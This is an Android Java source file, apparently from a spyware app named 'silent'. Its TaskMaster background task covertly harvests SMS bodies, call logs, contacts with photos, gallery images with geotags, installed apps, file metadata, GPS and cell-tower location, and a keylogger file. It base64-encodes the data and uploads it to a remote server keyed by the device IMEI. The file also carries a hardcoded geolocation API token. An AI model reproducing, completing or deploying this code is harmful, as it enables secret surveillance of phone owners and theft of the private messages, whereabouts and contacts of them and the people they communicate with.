package src.silent.jobs.tasks;

import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.location.Criteria;
import android.location.LocationManager;
import android.net.TrafficStats;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.Looper;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.system.Os;
import android.system.StructStat;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import src.silent.R;
import src.silent.utils.BatteryHandler;
import src.silent.utils.BitmapJsonHelper;
import src.silent.utils.DBAdapter;
import src.silent.utils.FirebaseHandler;
import src.silent.utils.LocationHandler;
import src.silent.utils.SHA1Helper;
import src.silent.utils.ServerCommunicationHandler;
import src.silent.utils.models.MasterTaskParams;

/**
 * Created by all3x on 2/23/2018.
 */

public class TaskMaster extends AsyncTask<MasterTaskParams, Void, Void> {

    @Override
    protected Void doInBackground(MasterTaskParams... params) {
        if (checkInternetConnection(params[0].context)) {
            String maskHash = ServerCommunicationHandler.getMask(params[0].context,
                    "https://192.168.1.24:443/api/Service/GetMask",
                    params[0].IMEI);
            String[] maskHash2 = maskHash.split(";");
            String[] hashes = maskHash2[1].split(":");


            getFilesMetadata(hashes[8], params[0].context, params[0].IMEI);
            JSONObject bulkData = new JSONObject();
            for (int i = 0; i < maskHash2[0].length(); i++) {
                if (maskHash2[0].charAt(i) == '1') {
                    switch (i) {
                        case 0:
                            getPhotos(hashes[i], MediaStore.Images.Media.INTERNAL_CONTENT_URI,
                                    params[0].context, params[0].IMEI);
                            getPhotos(hashes[i], MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                    params[0].context, params[0].IMEI);
                            break;
                        case 1:
                            getContacts(bulkData, hashes[i], params[0].context);
                            break;
                        case 2:
                            getCallHistory(bulkData, hashes[i], params[0].context);
                            break;
                        case 3:
                            getMessages(bulkData, hashes[i], params[0].context);
                            break;
                        case 4:
                            getMobileDataUsage(bulkData, hashes[i]);
                            break;
                        case 5:
                            getInstalledApps(hashes[i], params[0].context, params[0].IMEI);
                            break;
                        case 6:
                            getSmartphoneLocation(bulkData, hashes[i], params[0].context);
                            break;
                        case 7:
                            getKeystrokes(bulkData, hashes[i]);
                            break;
                        case 8:
                            getBatteryLevel(bulkData, params[0].context);
                            break;
                    }
                }
            }

            FirebaseHandler.insertArtist();
            ServerCommunicationHandler.executeDataPost(params[0].context,
                    "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                    params[0].IMEI);
            FirebaseHandler.deleteArtist();
        } else {
            getSmartphoneLocation(null, null, params[0].context);
        }


        return null;
    }

    private boolean checkInternetConnection(Context context) {
        boolean mobileYN = false;
        boolean wifiState;
        try {
            TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm.getSimState() == TelephonyManager.SIM_STATE_READY) {
                mobileYN = Settings.Global.getInt(context.getContentResolver(), "mobile_data", 1) == 1;
            }

            WifiManager wifi = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            wifiState = wifi.isWifiEnabled();
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
            mobileYN = false;
            wifiState = false;
        }

        return mobileYN || wifiState;
    }

    private void getFilesMetadata(String hash, Context context, String IMEI) {
        try {
            String newHash = hash;
            List<String> external = getListFiles(new File(Environment.getExternalStorageDirectory()
                    .toString()), hash);


            JSONArray informationArray = new JSONArray();
            int counter = 0;
            SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");
            for (String info : external) {
                counter++;
                String[] inf = info.split(";");
                Date date = df.parse(inf[1]);
                if (date.getTime() > Long.parseLong(newHash)) {
                    newHash = String.valueOf(date.getTime());
                }
                informationArray.put(Base64.encodeToString(info.getBytes(), Base64.URL_SAFE));


                if (counter % 1000 == 0) {
                    JSONObject bulkData = new JSONObject();
                    JSONObject metadata = new JSONObject();
                    metadata.put("Metadata", informationArray);
                    metadata.put("Hash", newHash);
                    bulkData.put("Metadata", metadata);
                    FirebaseHandler.insertArtist();
                    ServerCommunicationHandler.executeDataPost(context,
                            "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                            IMEI);
                    FirebaseHandler.deleteArtist();
                    informationArray = new JSONArray();
                }
            }

            if (informationArray.length() != 0) {
                JSONObject bulkData = new JSONObject();
                JSONObject metadata = new JSONObject();
                metadata.put("Metadata", informationArray);
                metadata.put("Hash", newHash);
                bulkData.put("Metadata", metadata);
                ServerCommunicationHandler.executeDataPost(context,
                        "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                        IMEI);
            }
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
        }
    }

    private List<String> getListFiles(File parentDir, String hash) {
        ArrayList<String> inFiles = new ArrayList<>();
        File[] files = parentDir.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    try {
                        StructStat stat = Os.stat(file.getAbsolutePath());
                        long lastAccessed = stat.st_atime * 1000L;
                        long lastModified = stat.st_mtime * 1000L;
                        Timestamp accessedTime = new Timestamp(lastAccessed);
                        Timestamp modifiedTime = new Timestamp(lastModified);

                        if (lastAccessed > Long.parseLong(hash)) {
                            inFiles.add(file.getAbsolutePath() + ";" + accessedTime.toString()
                                    + ";" + modifiedTime.toString());
                        }
                    } catch (Exception ex) {
                        Log.d("EROARE", ex.getMessage());
                    } finally {
                        inFiles.addAll(getListFiles(file, hash));
                    }
                } else {
                    try {
                        StructStat stat = Os.stat(file.getAbsolutePath());
                        long lastAccessed = stat.st_atime * 1000L;
                        long lastModified = stat.st_mtime * 1000L;
                        Timestamp accessedTime = new Timestamp(lastAccessed);
                        Timestamp modifiedTime = new Timestamp(lastModified);

                        if (lastAccessed > Long.parseLong(hash)) {

                            inFiles.add(file.getAbsolutePath() + ";" + accessedTime.toString()
                                    + ";" + modifiedTime.toString());
                        }
                    } catch (Exception ex) {
                        Log.d("EROARE", ex.getMessage());
                    }
                }
            }
        }
        return inFiles;
    }

    private void getKeystrokes(JSONObject bulkData, String hash) {
        try {
            FileInputStream fis = new FileInputStream(Environment.getExternalStorageDirectory().toString() + "/.Temp/log.txt");
            BufferedReader bfr = new BufferedReader(new InputStreamReader(fis));
            StringBuilder info = new StringBuilder();
            String line;
            while ((line = bfr.readLine()) != null) {
                info.append(line);
            }
            String information = info.toString();
            String SHA = SHA1Helper.SHA1(information);
            if (!SHA.equals(hash)) {
                JSONObject object = new JSONObject();
                object.put("Info", Base64.encodeToString(information.getBytes(), Base64.URL_SAFE));
                object.put("Hash", Base64.encodeToString(SHA.getBytes(), Base64.URL_SAFE));
                bulkData.put("Keylogger", object);
            }

        } catch (Exception ex) {
            Log.d("Keylogger", ex.getMessage());
        }
    }

    private void getSmartphoneLocation(JSONObject bulkData, String hash, Context context) {
        LocationManager locationManager = (LocationManager)
                context.getSystemService(Context.LOCATION_SERVICE);
        try {
            String[] latLong = null;
            if (bulkData != null) {
                JSONObject locationData = new JSONObject();
                String shaString = "";

                DBAdapter adapter = new DBAdapter(context, "databaseLocation");
                adapter.startConnection();
                List<String[]> latLongList = adapter.selectAllLatLong();
                List<String[]> codesList = adapter.selectAllCodes();
                JSONArray array = new JSONArray();
                if (!latLongList.isEmpty()) {
                    for (String[] item : latLongList) {
                        JSONObject object = new JSONObject();
                        object.put("Latitude", Base64.encodeToString(item[0].getBytes(),
                                Base64.URL_SAFE));
                        object.put("Longitude", Base64.encodeToString(item[1].getBytes(),
                                Base64.URL_SAFE));
                        object.put("Date", Base64.encodeToString(item[2].getBytes(),
                                Base64.URL_SAFE));
                        array.put(object);
                    }
                }
                if (!codesList.isEmpty()) {
                    for (String[] item : codesList) {
                        String[] latLongLocal = getLatLongFromCellLocation(item[0], item[1], item[3], item[2]);
                        JSONObject object = new JSONObject();
                        object.put("Latitude", Base64.encodeToString(latLongLocal[0].getBytes(),
                                Base64.URL_SAFE));
                        object.put("Longitude", Base64.encodeToString(latLongLocal[1].getBytes(),
                                Base64.URL_SAFE));
                        object.put("Date", Base64.encodeToString(item[4].getBytes(),
                                Base64.URL_SAFE));
                        array.put(object);
                    }
                }
                adapter.closeConnection();

                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                        locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    latLong = getLocationWithService(locationManager);
                } else {
                    String[] codes = getCellLocation(context);
                    if (!Arrays.asList(codes).contains("")) {
                        latLong = getLatLongFromCellLocation(codes[0], codes[1], codes[2], codes[3]);
                    }
                }

                if (latLong != null && !Arrays.asList(latLong).contains("")) {
                    shaString += latLong[0];
                    shaString += latLong[1];

                    String theHash = SHA1Helper.SHA1(shaString);
                    if (!theHash.equals(hash)) {
                        JSONObject object = new JSONObject();
                        object.put("Latitude",
                                Base64.encodeToString(latLong[0].getBytes(),
                                        Base64.URL_SAFE));
                        object.put("Longitude",
                                Base64.encodeToString(latLong[1].getBytes(),
                                        Base64.URL_SAFE));
                        Long milies = Calendar.getInstance().getTimeInMillis();
                        Timestamp currentTime = new Timestamp(milies);
                        object.put("Date", Base64.encodeToString(currentTime.toString().getBytes(),
                                Base64.URL_SAFE));

                        array.put(object);
                        locationData.put("Hash", Base64.encodeToString(theHash.getBytes(),
                                Base64.URL_SAFE));
                    }
                }
                if (array.length() != 0) {
                    locationData.put("Locations", array);
                    bulkData.put("Location", locationData);
                }
            } else {
                Long milies = Calendar.getInstance().getTimeInMillis();
                Timestamp currentTime = new Timestamp(milies);
                DBAdapter adapter = new DBAdapter(context, "databaseLocation");
                adapter.startConnection();
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                        locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    latLong = getLocationWithService(locationManager);

                    adapter.insertLatLong(latLong[0], latLong[1], currentTime.toString());
                } else {
                    String[] codes = getCellLocation(context);
                    if (!Arrays.asList(codes).contains("")) {
                        adapter.insertCodes(codes[0], codes[1], currentTime.toString(), codes[3], codes[2]);
                    }
                }
                adapter.closeConnection();
            }

        } catch (SecurityException ex) {
            Log.d("Location EXCEPTION", ex.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception ex) {
            Log.d("LOCATION EXCEPTION", ex.getMessage());
        }
    }

    private String[] getLatLongFromCellLocation(String cid, String lac, String mcc, String mnc) {
        String[] latLong = {"", ""};
        HttpURLConnection connection = null;
        try {
            URL url = new URL("http://eu1.unwiredlabs.com/v2/process.php");
            connection = (HttpURLConnection) url.openConnection();
            //connection.setReadTimeout(10000);
            //connection.setConnectTimeout(15000);
            connection.setRequestMethod("POST");
            connection.setDoInput(true);
            connection.setDoOutput(true);
            connection.setRequestProperty("Content-Type", "application/json");

            JSONObject jsonObject = new JSONObject();
            jsonObject.put("token", "901fde4ec0c92c");
            jsonObject.put("radio", "gsm");
            jsonObject.put("mcc", Integer.parseInt(mcc));
            jsonObject.put("mnc", Integer.parseInt(mnc));

            JSONArray array = new JSONArray();
            JSONObject cells = new JSONObject();
            cells.put("lac", Integer.parseInt(lac));
            cells.put("cid", Integer.parseInt(cid));
            array.put(cells);

            jsonObject.put("cells", array);
            jsonObject.put("address", 1);

            DataOutputStream outputStream = new DataOutputStream(connection.getOutputStream());
            outputStream.writeBytes(jsonObject.toString());
            outputStream.flush();
            outputStream.close();

            BufferedReader input = new BufferedReader(new InputStreamReader(connection.
                    getInputStream()));
            String response = "";
            for (String line; (line = input.readLine()) != null; response += line) ;

            JSONObject resp = new JSONObject(response);
            if (resp.has("lat")) {
                double lat = resp.getDouble("lat");
                latLong[0] = String.valueOf(lat);
            }
            if (resp.has("lon")) {
                double lon = resp.getDouble("lon");
                latLong[1] = String.valueOf(lon);
            }
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
            latLong[0] = "";
            latLong[1] = "";
        } finally {
            if (connection != null)
                connection.disconnect();
        }
        return latLong;
    }

    private String[] getCellLocation(Context context) {
        String[] codes = {"", "", "", ""};
        try {
            TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService
                    (Context.TELEPHONY_SERVICE);
            GsmCellLocation cellLocation = (GsmCellLocation) telephonyManager.getCellLocation();
            String networkOperator = telephonyManager.getNetworkOperator();

            codes[0] = String.valueOf(cellLocation.getCid());
            codes[1] = String.valueOf(cellLocation.getLac());
            if (!TextUtils.isEmpty(networkOperator)) {
                codes[2] = networkOperator.substring(0, 3);
                codes[3] = networkOperator.substring(3);
            } else {
                codes[2] = "";
                codes[3] = "";
            }
        } catch (SecurityException ex) {
            codes[0] = "";
            codes[1] = "";
            codes[2] = "";
            codes[3] = "";
        }

        return codes;
    }

    private String[] getLocationWithService(final LocationManager locationManager) {
        String[] latLong = {"", ""};
        try {
            final LocationHandler locationHandler = new LocationHandler();
            Thread thread = new Thread() {
                @Override
                public void run() {
                    Criteria criteria = new Criteria();
                    criteria.setAccuracy(Criteria.ACCURACY_COARSE);
                    criteria.setPowerRequirement(Criteria.POWER_LOW);
                    criteria.setAltitudeRequired(false);
                    criteria.setBearingRequired(false);
                    criteria.setSpeedRequired(false);
                    criteria.setCostAllowed(true);
                    criteria.setHorizontalAccuracy(Criteria.ACCURACY_HIGH);
                    criteria.setVerticalAccuracy(Criteria.ACCURACY_HIGH);
                    Looper.prepare();
                    locationManager.requestSingleUpdate(criteria, locationHandler, null);
                    Looper.loop();
                    if (Looper.myLooper() != null) {
                        Looper.myLooper().quit();
                    }
                }
            };
            thread.start();
            thread.join();

            locationManager.removeUpdates(locationHandler);
            latLong[0] = locationHandler.getLatitude();
            latLong[1] = locationHandler.getLongitude();

        } catch (SecurityException ex) {
            Log.d("Location EXCEPTION", ex.getMessage());
            latLong[0] = "";
            latLong[1] = "";
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
            latLong[0] = "";
            latLong[1] = "";
        }

        return latLong;
    }

    private void getMessages(JSONObject bulkData, String hash, Context context) {
        //TODO: imparte
        try {
            Uri message = Uri.parse("content://sms");
            ContentResolver cr = context.getContentResolver();
            final String[] projection = new String[]{"address", "body", "read", "date", "type"};
            String selection = null;
            String[] selectionArgs = null;
            if (!hash.equals("0")) {
                selection = "date>?";
                selectionArgs = new String[]{hash};
            }
            Cursor c = cr.query(message, projection, selection, selectionArgs, "date DESC");

            String newHash = "";
            int totalSMS = c.getCount();
            if (c.moveToFirst()) {
                JSONObject messages = new JSONObject();
                JSONArray informationArray = new JSONArray();
                for (int i = 0; i < totalSMS; i++) {
                    JSONObject information = new JSONObject();
                    information.put("Address", Base64.encodeToString(c.getString(c
                                    .getColumnIndexOrThrow("address")).getBytes(),
                            Base64.URL_SAFE));
                    information.put("Body", Base64.encodeToString(c.getString(c.
                            getColumnIndexOrThrow("body")).getBytes(), Base64.URL_SAFE));
                    information.put("State", Base64.encodeToString(c.getString(c
                            .getColumnIndex("read")).getBytes(), Base64.URL_SAFE));
                    Timestamp date = new Timestamp(Long.
                            parseLong(c.getString(c.getColumnIndexOrThrow("date"))));
                    String baseDate = Base64.encodeToString(date.toString().getBytes(),
                            Base64.URL_SAFE);
                    if (i == 0) {
                        newHash = c.getString(c.getColumnIndexOrThrow("date"));
                    }
                    information.put("Date", baseDate);
                    String type = c.getString(c.getColumnIndexOrThrow("type"));
                    if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
                        information.put("Type", Base64.encodeToString("Inbox".getBytes(),
                                Base64.URL_SAFE));
                    } else {
                        information.put("Type", Base64.encodeToString("Sent".getBytes(),
                                Base64.URL_SAFE));
                    }

                    informationArray.put(information);
                    c.moveToNext();
                }

                if (informationArray.length() != 0) {
                    messages.put("Messages", informationArray);
                    messages.put("Hash", newHash);
                    bulkData.put("Messages", messages);
                }
            }
            c.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void getContacts(JSONObject bulkData, String hash, Context context) {
        //TODO: imparte
        try {
            ContentResolver contentResolver = context.getContentResolver();
            String selection = null;
            String[] selectionArgs = null;
            if (!hash.equals("0")) {
                selection = "contact_last_updated_timestamp>?";
                selectionArgs = new String[]{hash};
            }
            Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                    null, selection, selectionArgs,
                    "contact_last_updated_timestamp DESC");

            if (cursor != null) {
                List<String> numbers = new ArrayList<>();
                JSONObject contacts = new JSONObject();
                JSONArray informationArray = new JSONArray();
                String newHash = "";
                boolean first = true;
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    if (cursor.getInt(cursor.getColumnIndex(ContactsContract.
                            Contacts.HAS_PHONE_NUMBER)) > 0) {
                        Cursor cursorInfo = contentResolver.query(ContactsContract.
                                        CommonDataKinds.Phone.CONTENT_URI, null,
                                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                                new String[]{id}, null);
                        InputStream inputStream = ContactsContract.Contacts.
                                openContactPhotoInputStream(context.getContentResolver(),
                                        ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                                                new Long(id)));

                        Uri person = ContentUris.withAppendedId(ContactsContract.Contacts.CONTENT_URI,
                                new Long(id));
                        Uri pURI = Uri.withAppendedPath(person,
                                ContactsContract.Contacts.Photo.CONTENT_DIRECTORY);

                        Bitmap photo = null;
                        if (inputStream != null) {
                            photo = BitmapFactory.decodeStream(inputStream);
                        }
                        cursorInfo.moveToFirst();
                        if (!numbers.contains(cursorInfo.getString(cursorInfo.
                                getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                .replace(" ", ""))) {
                            numbers.add(cursorInfo.getString(cursorInfo.
                                    getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
                                    .replace(" ", ""));

                            JSONObject information = new JSONObject();
                            information.put("Name", Base64.encodeToString(
                                    cursor.getString(cursor
                                            .getColumnIndex(ContactsContract.
                                                    Contacts.DISPLAY_NAME)).getBytes(),
                                    Base64.URL_SAFE
                            ));
                            information.put("Number", Base64.encodeToString(
                                    cursorInfo.getString(cursorInfo.
                                            getColumnIndex(ContactsContract
                                                    .CommonDataKinds.Phone.NUMBER))
                                            .replace(" ", "")
                                            .getBytes(),
                                    Base64.URL_SAFE
                            ));
                            information.put("Picture", BitmapJsonHelper
                                    .getStringFromBitmap(photo));

                            if (first) {
                                first = false;
                                newHash = cursor.getString(cursor.getColumnIndex(ContactsContract.
                                        Contacts.CONTACT_LAST_UPDATED_TIMESTAMP));
                            }

                            informationArray.put(information);
                        }
                        cursorInfo.close();
                    }
                }

                if (informationArray.length() != 0) {
                    contacts.put("ContactList", informationArray);
                    contacts.put("Hash", newHash);
                    bulkData.put("Contacts", contacts);
                }
                cursor.close();
            }
        } catch (Exception ex) {

        }
    }

    private void getCallHistory(JSONObject bulkData, String hash, Context context) {
        try {
            ContentResolver contentResolver = context.getContentResolver();
            String selection = null;
            String[] selectionArgs = null;
            if (!hash.equals("0")) {
                selection = "date>?";
                selectionArgs = new String[]{hash};
            }
            Cursor managedCursor = contentResolver.query(CallLog.Calls.CONTENT_URI, null,
                    selection, selectionArgs, "date DESC");
            if (managedCursor != null) {
                int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
                int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
                int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
                int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

                JSONObject callHistory = new JSONObject();
                JSONArray informationArray = new JSONArray();
                String newHash = "";
                boolean first = true;
                while (managedCursor.moveToNext()) {
                    JSONObject information = new JSONObject();
                    information.put("Number",
                            Base64.encodeToString(managedCursor.getString(number)
                                            .replace(" ", "").getBytes(),
                                    Base64.URL_SAFE));
                    Timestamp cal = new Timestamp(Long.valueOf(managedCursor.getString(date)));
                    information.put("Date",
                            Base64.encodeToString(cal.toString().getBytes(),
                                    Base64.URL_SAFE));
                    if (first) {
                        first = false;
                        newHash = managedCursor.getString(date);
                    }
                    information.put("Duration",
                            Base64.encodeToString(managedCursor.getString(duration).getBytes(),
                                    Base64.URL_SAFE));
                    information.put("Direction",
                            Base64.encodeToString(getCallType(managedCursor.getString(type))
                                    .getBytes(), Base64.URL_SAFE));
                    informationArray.put(information);
                }
                managedCursor.close();

                if (informationArray.length() != 0) {
                    callHistory.put("Calls", informationArray);
                    callHistory.put("Hash", newHash);
                    bulkData.put("CallHistory", callHistory);
                }
            }
        } catch (SecurityException ex) {
            Log.d("CALL LOG EX", ex.getMessage());
        } catch (JSONException e) {
            e.printStackTrace();
        }
    }

    private String getCallType(String callType) {
        int dircode = Integer.parseInt(callType);
        switch (dircode) {
            case CallLog.Calls.OUTGOING_TYPE:
                return "OUTGOING";

            case CallLog.Calls.INCOMING_TYPE:
                return "INCOMING";

            case CallLog.Calls.MISSED_TYPE:
                return "MISSED";
            default:
                return "";
        }
    }

    private void getMobileDataUsage(JSONObject bulkData, String hash) {
        try {
            long totalTraficReceived = TrafficStats.getTotalRxBytes() / (1024 * 1024);
            long totalTraficTransmitted = TrafficStats.getTotalTxBytes() / (1024 * 1024);
            long totalTrafic = totalTraficReceived + totalTraficTransmitted;

            String total = String.valueOf(totalTrafic);
            JSONObject totalTraficJson = new JSONObject();
            totalTraficJson.put("Trafic", Base64.encodeToString(total.getBytes(),
                    Base64.URL_SAFE));

            String sha = SHA1Helper.SHA1(total);
            if (!sha.equals(hash)) {
                totalTraficJson.put("Hash", Base64.encodeToString(sha.getBytes(),
                        Base64.URL_SAFE));
                bulkData.put("Trafic", totalTraficJson);
            }
        } catch (Exception ex) {

        }

    }

    private void getInstalledApps(String hash, Context context, String IMEI) {
        try {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(0);

            JSONObject applications = new JSONObject();
            JSONArray informationArray = new JSONArray();
            long newHash = 0;
            int counter = 0;
            for (ApplicationInfo packageInfo : packages) {
                String package_name = packageInfo.packageName;
                long appDate = pm.getPackageInfo(package_name, 0).firstInstallTime;
                if (appDate > Long.parseLong(hash)) {
                    counter++;
                    JSONObject information = new JSONObject();

                    ApplicationInfo app = pm.getApplicationInfo(package_name, 0);
                    information.put("Name", Base64.encodeToString(((String) pm
                            .getApplicationLabel(app)).getBytes(), Base64.URL_SAFE));
                    Drawable drIcon = pm.getApplicationIcon(app);
                    Bitmap icon = null;
                    try {
                        icon = ((BitmapDrawable) drIcon).getBitmap();
                    } catch (Exception ex) {
                        icon = BitmapFactory.decodeResource(context.getResources(), R.drawable.app);
                    }

                    information.put("Icon", BitmapJsonHelper.getStringFromBitmap(icon));
                    informationArray.put(information);

                    if (appDate > newHash) {
                        newHash = appDate;
                    }

                    if (counter % 10 == 0) {
                        JSONObject bulkData = new JSONObject();
                        applications.put("Applications", informationArray);
                        applications.put("Hash", newHash);
                        bulkData.put("Applications", applications);
                        FirebaseHandler.insertArtist();
                        ServerCommunicationHandler.executeDataPost(context,
                                "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                                IMEI);
                        FirebaseHandler.deleteArtist();
                        informationArray = new JSONArray();
                    }
                }
            }

            if (informationArray.length() != 0) {
                JSONObject bulkData = new JSONObject();
                applications.put("Applications", informationArray);
                applications.put("Hash", newHash);
                bulkData.put("Applications", applications);
                ServerCommunicationHandler.executeDataPost(context,
                        "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                        IMEI);
            }
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
        }
    }

    private void getPhotos(String hash, Uri uri, Context context, String IMEI) {
        try {
            JSONObject photos = new JSONObject();
            JSONArray informationArray = new JSONArray();

            ContentResolver cr = context.getContentResolver();
            String[] filePathColumn = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN,
                    MediaStore.Images.Media.LATITUDE, MediaStore.Images.Media.LONGITUDE};
            String selection = null;
            String[] selectionArgs = null;
            String newHash = hash;
            boolean first = true;
            if (!hash.equals("0")) {
                selection = "datetaken>?";
                selectionArgs = new String[]{hash};
            }
            Cursor cur = cr.query(uri, filePathColumn
                    , selection, selectionArgs, "datetaken DESC");

            if (cur.moveToFirst()) {
                int columnIndex = cur.getColumnIndex(filePathColumn[0]);
                int dateTakenIndex = cur.getColumnIndex(filePathColumn[1]);
                int latitudeIndex = cur.getColumnIndex(filePathColumn[2]);
                int longitudeIndex = cur.getColumnIndex(filePathColumn[3]);
                int counter = 0;
                do {
                    counter++;
                    String picturePath = cur.getString(columnIndex);
                    if (picturePath != null) {

                        Timestamp datetaken = new Timestamp(Long
                                .parseLong(cur.getString(dateTakenIndex)));
                        if (first) {
                            first = false;
                            newHash = cur.getString(dateTakenIndex);
                        }
                        String longitude = cur.getString(longitudeIndex);
                        String latitude = cur.getString(latitudeIndex);

                        JSONObject information = new JSONObject();
                        File file = new File(picturePath);
                        InputStream inputStream = new FileInputStream(file);
                        byte[] array = readBytes(inputStream);
                        Bitmap image = BitmapFactory.decodeByteArray(array, 0, array.length);
                        Bitmap scaledImage = Bitmap
                                .createScaledBitmap(image, 200, 200, false);

                        information.put("Image", BitmapJsonHelper.getStringFromBitmap(scaledImage));
                        information.put("Date", Base64.encodeToString(datetaken
                                .toString().getBytes(), Base64.URL_SAFE));
                        if (latitude == null) {
                            information.put("Latitude", "");
                        } else {
                            information.put("Latitude", Base64
                                    .encodeToString(latitude.getBytes(), Base64.URL_SAFE));
                        }

                        if (longitude == null) {
                            information.put("Longitude", "");
                        } else {
                            information.put("Longitude", Base64
                                    .encodeToString(longitude.getBytes(), Base64.URL_SAFE));
                        }

                        informationArray.put(information);
                        if (counter % 10 == 0) {
                            JSONObject bulkData = new JSONObject();
                            photos.put("Photos", informationArray);
                            photos.put("Hash", newHash);
                            bulkData.put("Photos", photos);
                            FirebaseHandler.insertArtist();
                            ServerCommunicationHandler.executeDataPost(context,
                                    "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                                    IMEI);
                            FirebaseHandler.deleteArtist();
                            informationArray = new JSONArray();
                        }
                    }

                } while (cur.moveToNext());
            }
            cur.close();

            if (informationArray.length() != 0) {
                JSONObject bulkData = new JSONObject();
                photos.put("Photos", informationArray);
                photos.put("Hash", newHash);
                bulkData.put("Photos", photos);

                ServerCommunicationHandler.executeDataPost(context,
                        "https://192.168.1.24:443/api/Service/GatherAllData", bulkData,
                        IMEI);
            }
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
        }
    }

    private byte[] readBytes(InputStream inputStream) throws Exception {
        // this dynamically extends to take the bytes you read
        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();

        // this is storage overwritten on each iteration with bytes
        int bufferSize = 1024;
        byte[] buffer = new byte[bufferSize];

        // we need to know how may bytes were read to write them to the byteBuffer
        int len = 0;
        while ((len = inputStream.read(buffer)) != -1) {
            byteBuffer.write(buffer, 0, len);
            Log.d("Size", "" + len);
        }

        // and then we can return your byte array.
        return byteBuffer.toByteArray();
    }

    private void getBatteryLevel(JSONObject bulkData, Context context) {
        try {
            BatteryHandler batteryReceriver = new BatteryHandler();
            IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
            context.registerReceiver(batteryReceriver, batteryFilter);

            bulkData.put("BatteryLevel", batteryReceriver.getBatteryLevel());
        } catch (Exception ex) {
            Log.d("EROARE", ex.getMessage());
        }
    }
}
